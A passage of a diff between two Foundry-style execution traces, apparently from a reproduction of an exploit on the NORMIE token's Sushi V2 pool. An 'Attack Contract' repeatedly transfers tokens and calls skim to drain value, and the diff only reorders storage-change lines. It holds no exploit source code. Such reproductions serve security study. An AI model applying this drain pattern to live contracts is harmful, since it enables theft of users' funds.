     │   │   │   │   │   ├─ emit Approval(owner: NORMIE: [0x7F12d13B34F5F4f0a9449c16Bcd42f0da47AF200], spender: SushiRouterv2: [0x6BDED42c6DA8FBf0d2bA55B2fa120C5e0c8D7891], value: 0)
     │   │   │   │   │   ├─  storage changes:
     │   │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x00000000000000000000000000000000000000000000000000181b00e13caba7 → 0x0000000000000000000000000000000000000000000000000007f0cd73824ba7
-    │   │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x00000000000000000000000000000000000000000000000000b6d31c854c4465 → 0x00000000000000000000000000000000000000000000000000c6fd4ff306a465
     │   │   │   │   │   │   @ 0x4f8e73b8a1533d3886ca4bbc3edb63bf3610458ad27e93e2b8290bcb666c815b: 0x00000000000000000000000000000000000000000000000000102a336dba6000 → 0
+    │   │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x00000000000000000000000000000000000000000000000000b6d31c854c4465 → 0x00000000000000000000000000000000000000000000000000c6fd4ff306a465
     │   │   │   │   │   └─ ← [Return] true
     │   │   │   │   ├─ [517] SushiV2Pair::getReserves() [staticcall]
     │   │   │   │   │   └─ ← [Return] 51507778232379036062 [5.15e19], 51460565210252389 [5.146e16], 1716694911 [1.716e9]
@@ -1058,8 +966,8 @@ Traces:
     │   │   │   │   ├─ emit stepLiquify(: false, : true, : false, : true)
     │   │   │   │   ├─ emit Transfer(from: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], to: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2266628300256719 [2.266e15])
     │   │   │   │   ├─  storage changes:
-    │   │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0 → 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf
     │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x00000000000000000000000000000000000000000000000000cf0acc79b35a34 → 0x00000000000000000000000000000000000000000000000000c6fd4ff306a465
+    │   │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0 → 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf
     │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x0000000000000000000000000000000000000000000000000007f0cd73824ba7 → 0x000000000000000000000000000000000000000000000000000ffe49fa2f0176
     │   │   │   │   └─ ← [Return] true
     │   │   │   └─ ← [Stop]
@@ -1068,8 +976,8 @@ Traces:
     │   │   │   ├─ emit stepLiquify(: false, : true, : true, : true)
     │   │   │   ├─ emit Transfer(from: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], value: 2266628300256719 [2.266e15])
     │   │   │   ├─  storage changes:
-    │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf → 0
     │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x00000000000000000000000000000000000000000000000000c6fd4ff306a465 → 0x00000000000000000000000000000000000000000000000000cf0acc79b35a34
+    │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf → 0
     │   │   │   └─ ← [Return] true
     │   │   ├─ [45039] SushiV2Pair::skim(Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
     │   │   │   ├─ [457] WETH::balanceOf(SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f]) [staticcall]
@@ -1113,8 +1021,8 @@ Traces:
     │   │   │   │   │   ├─ [22901] WETH::transfer(SushiRouterv2: [0x6BDED42c6DA8FBf0d2bA55B2fa120C5e0c8D7891], 3546482325120738637 [3.546e18])
     │   │   │   │   │   │   ├─ emit Transfer(from: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], to: SushiRouterv2: [0x6BDED42c6DA8FBf0d2bA55B2fa120C5e0c8D7891], value: 3546482325120738637 [3.546e18])
     │   │   │   │   │   │   ├─  storage changes:
-    │   │   │   │   │   │   │   @ 0xb7f00540c39cd87ef3e4b07d856896278fdba0ce5372ab66c55f72b6297e8a10: 0 → 0x0000000000000000000000000000000000000000000000003137a2e27705e54d
     │   │   │   │   │   │   │   @ 0xfdf5227b1487be35dc63aab006c1a41e45e86b4b570aba92f1d1bb5aed6ed234: 0x00000000000000000000000000000000000000000000000290e80b6650d1287b → 0x0000000000000000000000000000000000000000000000025fb06883d9cb432e
+    │   │   │   │   │   │   │   @ 0xb7f00540c39cd87ef3e4b07d856896278fdba0ce5372ab66c55f72b6297e8a10: 0 → 0x0000000000000000000000000000000000000000000000003137a2e27705e54d
     │   │   │   │   │   │   └─ ← [Return] true
     │   │   │   │   │   ├─ [457] WETH::balanceOf(SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f]) [staticcall]
     │   │   │   │   │   │   └─ ← [Return] 43788614092427313966 [4.378e19]
@@ -1147,8 +1055,8 @@ Traces:
     │   │   │   ├─ emit Transfer(from: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], value: 2266628300256719 [2.266e15])
     │   │   │   ├─  storage changes:
     │   │   │   │   @ 0x4f8e73b8a1533d3886ca4bbc3edb63bf3610458ad27e93e2b8290bcb666c815b: 0 → 0x00000000000000000000000000000000000000000000000000102a336dba6000
-    │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x00000000000000000000000000000000000000000000000000d7278360c10465 → 0x00000000000000000000000000000000000000000000000000df34ffe76dba34
     │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf → 0
+    │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x00000000000000000000000000000000000000000000000000d7278360c10465 → 0x00000000000000000000000000000000000000000000000000df34ffe76dba34
     │   │   │   └─ ← [Return] true
     │   │   ├─ [45039] SushiV2Pair::skim(Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
     │   │   │   ├─ [457] WETH::balanceOf(SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f]) [staticcall]
@@ -1163,9 +1071,9 @@ Traces:
     │   │   │   │   ├─ emit stepLiquify(: false, : true, : false, : true)
     │   │   │   │   ├─ emit Transfer(from: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], to: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2266628300256719 [2.266e15])
     │   │   │   │   ├─  storage changes:
-    │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x0000000000000000000000000000000000000000000000000007e19313215745 → 0x000000000000000000000000000000000000000000000000000fef0f99ce0d14
     │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x00000000000000000000000000000000000000000000000000df34ffe76dba34 → 0x00000000000000000000000000000000000000000000000000d7278360c10465
     │   │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0 → 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf
+    │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x0000000000000000000000000000000000000000000000000007e19313215745 → 0x000000000000000000000000000000000000000000000000000fef0f99ce0d14
     │   │   │   │   └─ ← [Return] true
     │   │   │   └─ ← [Stop]
     │   │   ├─ [12931] NORMIE::transfer(SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], 2266628300256719 [2.266e15])
@@ -1189,9 +1097,9 @@ Traces:
     │   │   │   │   ├─ emit stepLiquify(: false, : true, : false, : true)
     │   │   │   │   ├─ emit Transfer(from: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], to: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2266628300256719 [2.266e15])
     │   │   │   │   ├─  storage changes:
-    │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x00000000000000000000000000000000000000000000000000df34ffe76dba34 → 0x00000000000000000000000000000000000000000000000000d7278360c10465
     │   │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0 → 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf
     │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x000000000000000000000000000000000000000000000000000fef0f99ce0d14 → 0x0000000000000000000000000000000000000000000000000017fc8c207ac2e3
+    │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x00000000000000000000000000000000000000000000000000df34ffe76dba34 → 0x00000000000000000000000000000000000000000000000000d7278360c10465
     │   │   │   │   └─ ← [Return] true
     │   │   │   └─ ← [Stop]
     │   │   ├─ [109078] NORMIE::transfer(SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], 2266628300256719 [2.266e15])
@@ -1206,9 +1114,9 @@ Traces:
     │   │   │   │   │   ├─ emit Transfer(from: NORMIE: [0x7F12d13B34F5F4f0a9449c16Bcd42f0da47AF200], to: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], value: 4550000000000000 [4.55e15])
     │   │   │   │   │   ├─ emit Approval(owner: NORMIE: [0x7F12d13B34F5F4f0a9449c16Bcd42f0da47AF200], spender: SushiRouterv2: [0x6BDED42c6DA8FBf0d2bA55B2fa120C5e0c8D7891], value: 0)
     │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x0000000000000000000000000000000000000000000000000017fc8c207ac2e3 → 0x0000000000000000000000000000000000000000000000000007d258b2c062e3
     │   │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x00000000000000000000000000000000000000000000000000d7278360c10465 → 0x00000000000000000000000000000000000000000000000000e751b6ce7b6465
     │   │   │   │   │   │   @ 0x4f8e73b8a1533d3886ca4bbc3edb63bf3610458ad27e93e2b8290bcb666c815b: 0x00000000000000000000000000000000000000000000000000102a336dba6000 → 0
-    │   │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x0000000000000000000000000000000000000000000000000017fc8c207ac2e3 → 0x0000000000000000000000000000000000000000000000000007d258b2c062e3
     │   │   │   │   │   └─ ← [Return] true
     │   │   │   │   ├─ [517] SushiV2Pair::getReserves() [staticcall]
     │   │   │   │   │   └─ ← [Return] 43788614092427313966 [4.378e19], 60560565210252389 [6.056e16], 1716694911 [1.716e9]
@@ -1218,8 +1126,8 @@ Traces:
     │   │   │   │   │   ├─ [22901] WETH::transfer(SushiRouterv2: [0x6BDED42c6DA8FBf0d2bA55B2fa120C5e0c8D7891], 3051457644292458191 [3.051e18])
     │   │   │   │   │   │   ├─ emit Transfer(from: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], to: SushiRouterv2: [0x6BDED42c6DA8FBf0d2bA55B2fa120C5e0c8D7891], value: 3051457644292458191 [3.051e18])
     │   │   │   │   │   │   ├─  storage changes:
-    │   │   │   │   │   │   │   @ 0xfdf5227b1487be35dc63aab006c1a41e45e86b4b570aba92f1d1bb5aed6ed234: 0x0000000000000000000000000000000000000000000000025fb06883d9cb432e → 0x000000000000000000000000000000000000000000000002355773f472977c5f
     │   │   │   │   │   │   │   @ 0xb7f00540c39cd87ef3e4b07d856896278fdba0ce5372ab66c55f72b6297e8a10: 0 → 0x0000000000000000000000000000000000000000000000002a58f48f6733c6cf
+    │   │   │   │   │   │   │   @ 0xfdf5227b1487be35dc63aab006c1a41e45e86b4b570aba92f1d1bb5aed6ed234: 0x0000000000000000000000000000000000000000000000025fb06883d9cb432e → 0x000000000000000000000000000000000000000000000002355773f472977c5f
     │   │   │   │   │   │   └─ ← [Return] true
     │   │   │   │   │   ├─ [457] WETH::balanceOf(SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f]) [staticcall]
     │   │   │   │   │   │   └─ ← [Return] 40737156448134855775 [4.073e19]
@@ -1251,8 +1159,8 @@ Traces:
     │   │   │   │   └─ ← [Stop]
     │   │   │   ├─ emit Transfer(from: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], value: 2266628300256719 [2.266e15])
     │   │   │   ├─  storage changes:
-    │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x00000000000000000000000000000000000000000000000000e751b6ce7b6465 → 0x00000000000000000000000000000000000000000000000000ef5f3355281a34
     │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf → 0
+    │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x00000000000000000000000000000000000000000000000000e751b6ce7b6465 → 0x00000000000000000000000000000000000000000000000000ef5f3355281a34
     │   │   │   │   @ 0x4f8e73b8a1533d3886ca4bbc3edb63bf3610458ad27e93e2b8290bcb666c815b: 0 → 0x00000000000000000000000000000000000000000000000000102a336dba6000
     │   │   │   └─ ← [Return] true
     │   │   ├─ [45039] SushiV2Pair::skim(Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
@@ -1268,9 +1176,9 @@ Traces:
     │   │   │   │   ├─ emit stepLiquify(: false, : true, : false, : true)
     │   │   │   │   ├─ emit Transfer(from: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], to: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2266628300256719 [2.266e15])
     │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x0000000000000000000000000000000000000000000000000007d258b2c062e3 → 0x000000000000000000000000000000000000000000000000000fdfd5396d18b2
     │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x00000000000000000000000000000000000000000000000000ef5f3355281a34 → 0x00000000000000000000000000000000000000000000000000e751b6ce7b6465
     │   │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0 → 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf
-    │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x0000000000000000000000000000000000000000000000000007d258b2c062e3 → 0x000000000000000000000000000000000000000000000000000fdfd5396d18b2
     │   │   │   │   └─ ← [Return] true
     │   │   │   └─ ← [Stop]
     │   │   ├─ [12931] NORMIE::transfer(SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], 2266628300256719 [2.266e15])
@@ -1278,8 +1186,8 @@ Traces:
     │   │   │   ├─ emit stepLiquify(: false, : true, : true, : true)
     │   │   │   ├─ emit Transfer(from: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], value: 2266628300256719 [2.266e15])
     │   │   │   ├─  storage changes:
-    │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x00000000000000000000000000000000000000000000000000e751b6ce7b6465 → 0x00000000000000000000000000000000000000000000000000ef5f3355281a34
     │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf → 0
+    │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x00000000000000000000000000000000000000000000000000e751b6ce7b6465 → 0x00000000000000000000000000000000000000000000000000ef5f3355281a34
     │   │   │   └─ ← [Return] true
     │   │   ├─ [45039] SushiV2Pair::skim(Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
     │   │   │   ├─ [457] WETH::balanceOf(SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f]) [staticcall]
@@ -1294,9 +1202,9 @@ Traces:
     │   │   │   │   ├─ emit stepLiquify(: false, : true, : false, : true)
     │   │   │   │   ├─ emit Transfer(from: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], to: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2266628300256719 [2.266e15])
     │   │   │   │   ├─  storage changes:
-    │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x00000000000000000000000000000000000000000000000000ef5f3355281a34 → 0x00000000000000000000000000000000000000000000000000e751b6ce7b6465
     │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x000000000000000000000000000000000000000000000000000fdfd5396d18b2 → 0x0000000000000000000000000000000000000000000000000017ed51c019ce81
     │   │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0 → 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf
+    │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x00000000000000000000000000000000000000000000000000ef5f3355281a34 → 0x00000000000000000000000000000000000000000000000000e751b6ce7b6465
     │   │   │   │   └─ ← [Return] true
     │   │   │   └─ ← [Stop]
     │   │   ├─ [109078] NORMIE::transfer(SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], 2266628300256719 [2.266e15])
@@ -1311,9 +1219,9 @@ Traces:
     │   │   │   │   │   ├─ emit Transfer(from: NORMIE: [0x7F12d13B34F5F4f0a9449c16Bcd42f0da47AF200], to: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], value: 4550000000000000 [4.55e15])
     │   │   │   │   │   ├─ emit Approval(owner: NORMIE: [0x7F12d13B34F5F4f0a9449c16Bcd42f0da47AF200], spender: SushiRouterv2: [0x6BDED42c6DA8FBf0d2bA55B2fa120C5e0c8D7891], value: 0)
     │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x00000000000000000000000000000000000000000000000000e751b6ce7b6465 → 0x00000000000000000000000000000000000000000000000000f77bea3c35c465
     │   │   │   │   │   │   @ 0x4f8e73b8a1533d3886ca4bbc3edb63bf3610458ad27e93e2b8290bcb666c815b: 0x00000000000000000000000000000000000000000000000000102a336dba6000 → 0
     │   │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x0000000000000000000000000000000000000000000000000017ed51c019ce81 → 0x0000000000000000000000000000000000000000000000000007c31e525f6e81
-    │   │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x00000000000000000000000000000000000000000000000000e751b6ce7b6465 → 0x00000000000000000000000000000000000000000000000000f77bea3c35c465
     │   │   │   │   │   └─ ← [Return] true
     │   │   │   │   ├─ [517] SushiV2Pair::getReserves() [staticcall]
     │   │   │   │   │   └─ ← [Return] 40737156448134855775 [4.073e19], 65110565210252389 [6.511e16], 1716694911 [1.716e9]
@@ -1357,8 +1265,8 @@ Traces:
     │   │   │   ├─ emit Transfer(from: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], value: 2266628300256719 [2.266e15])
     │   │   │   ├─  storage changes:
     │   │   │   │   @ 0x4f8e73b8a1533d3886ca4bbc3edb63bf3610458ad27e93e2b8290bcb666c815b: 0 → 0x00000000000000000000000000000000000000000000000000102a336dba6000
-    │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf → 0
     │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x00000000000000000000000000000000000000000000000000f77bea3c35c465 → 0x00000000000000000000000000000000000000000000000000ff8966c2e27a34
+    │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf → 0
     │   │   │   └─ ← [Return] true
     │   │   ├─ [45039] SushiV2Pair::skim(Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
     │   │   │   ├─ [457] WETH::balanceOf(SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f]) [staticcall]
@@ -1374,8 +1282,8 @@ Traces:
     │   │   │   │   ├─ emit Transfer(from: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], to: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2266628300256719 [2.266e15])
     │   │   │   │   ├─  storage changes:
     │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x0000000000000000000000000000000000000000000000000007c31e525f6e81 → 0x000000000000000000000000000000000000000000000000000fd09ad90c2450
-    │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x00000000000000000000000000000000000000000000000000ff8966c2e27a34 → 0x00000000000000000000000000000000000000000000000000f77bea3c35c465
     │   │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0 → 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf
+    │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x00000000000000000000000000000000000000000000000000ff8966c2e27a34 → 0x00000000000000000000000000000000000000000000000000f77bea3c35c465
     │   │   │   │   └─ ← [Return] true
     │   │   │   └─ ← [Stop]
     │   │   ├─ [12931] NORMIE::transfer(SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], 2266628300256719 [2.266e15])
@@ -1383,8 +1291,8 @@ Traces:
     │   │   │   ├─ emit stepLiquify(: false, : true, : true, : true)
     │   │   │   ├─ emit Transfer(from: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], value: 2266628300256719 [2.266e15])
     │   │   │   ├─  storage changes:
-    │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf → 0
     │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x00000000000000000000000000000000000000000000000000f77bea3c35c465 → 0x00000000000000000000000000000000000000000000000000ff8966c2e27a34
+    │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf → 0
     │   │   │   └─ ← [Return] true
     │   │   ├─ [45039] SushiV2Pair::skim(Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
     │   │   │   ├─ [457] WETH::balanceOf(SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f]) [staticcall]
@@ -1399,8 +1307,8 @@ Traces:
     │   │   │   │   ├─ emit stepLiquify(: false, : true, : false, : true)
     │   │   │   │   ├─ emit Transfer(from: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], to: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2266628300256719 [2.266e15])
     │   │   │   │   ├─  storage changes:
-    │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x00000000000000000000000000000000000000000000000000ff8966c2e27a34 → 0x00000000000000000000000000000000000000000000000000f77bea3c35c465
     │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x000000000000000000000000000000000000000000000000000fd09ad90c2450 → 0x0000000000000000000000000000000000000000000000000017de175fb8da1f
+    │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x00000000000000000000000000000000000000000000000000ff8966c2e27a34 → 0x00000000000000000000000000000000000000000000000000f77bea3c35c465
     │   │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0 → 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf
     │   │   │   │   └─ ← [Return] true
     │   │   │   └─ ← [Stop]
@@ -1461,9 +1369,9 @@ Traces:
     │   │   │   │   └─ ← [Stop]
     │   │   │   ├─ emit Transfer(from: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], value: 2266628300256719 [2.266e15])
     │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf → 0
     │   │   │   │   @ 0x4f8e73b8a1533d3886ca4bbc3edb63bf3610458ad27e93e2b8290bcb666c815b: 0 → 0x00000000000000000000000000000000000000000000000000102a336dba6000
     │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x0000000000000000000000000000000000000000000000000107a61da9f02465 → 0x000000000000000000000000000000000000000000000000010fb39a309cda34
-    │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf → 0
     │   │   │   └─ ← [Return] true
     │   │   ├─ [45039] SushiV2Pair::skim(Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
     │   │   │   ├─ [457] WETH::balanceOf(SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f]) [staticcall]
@@ -1478,9 +1386,9 @@ Traces:
     │   │   │   │   ├─ emit stepLiquify(: false, : true, : false, : true)
     │   │   │   │   ├─ emit Transfer(from: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], to: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2266628300256719 [2.266e15])
     │   │   │   │   ├─  storage changes:
-    │   │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0 → 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf
-    │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x0000000000000000000000000000000000000000000000000007b3e3f1fe7a1f → 0x000000000000000000000000000000000000000000000000000fc16078ab2fee
     │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x000000000000000000000000000000000000000000000000010fb39a309cda34 → 0x0000000000000000000000000000000000000000000000000107a61da9f02465
+    │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x0000000000000000000000000000000000000000000000000007b3e3f1fe7a1f → 0x000000000000000000000000000000000000000000000000000fc16078ab2fee
+    │   │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0 → 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf
     │   │   │   │   └─ ← [Return] true
